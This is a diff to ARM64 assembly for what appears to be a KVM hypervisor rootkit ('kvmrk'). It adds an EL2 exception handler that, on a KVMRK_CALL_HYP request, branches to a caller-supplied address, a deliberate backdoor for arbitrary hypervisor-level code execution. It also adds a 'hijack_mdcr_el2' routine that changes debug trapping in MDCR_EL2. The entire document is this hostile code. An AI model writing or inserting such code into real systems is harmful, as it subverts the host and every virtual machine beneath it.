@@ -8,8 +8,13 @@
 #include <asm/ptrace.h>
 #include <asm/virt.h>
 
-
 #include "include/kvmrk.h"
+
+.macro kvmrk_end label
+	SYM_CODE_START(\label)
+		nop
+	SYM_CODE_END(\label)
+	.endm
 
 	.text
 	.pushsection	.kvmrk.text, "ax"
@@ -39,12 +44,27 @@ SYM_CODE_START(kvmrk_vectors)
 __invalid:
 	b	.
 __do_kvmrk_el1_sync:
-	mov_q	 x0, 0x600dca11
+	cmp	    x0, #KVMRK_CALL_HYP
+	bne		1f
+	br 		x1
+	eret
+1:
+	cmp 	x0, #KVMRK_CRASH_EVERYTHING
+	bne 	1f
+	eret
+1:
  	eret
 SYM_CODE_END(kvmrk_vectors)
-SYM_CODE_START(kvmrk_vectors_end)
-	nop
-SYM_CODE_END(kvmrk_vectors_end)
+kvmrk_end kvmrk_vectors_end
+
+SYM_CODE_START(hijack_mdcr_el2)
+	mrs 	x0, mdcr_el2
+	orr 	x0, x0, #MDCR_EL2_TDA
+	msr 	mdcr_el2, x0
+	mov_q	x0, 0x600dca11
+	eret
+SYM_CODE_END(hijack_mdcr_el2)
+kvmrk_end hijack_mdcr_el2_end
 
 
 
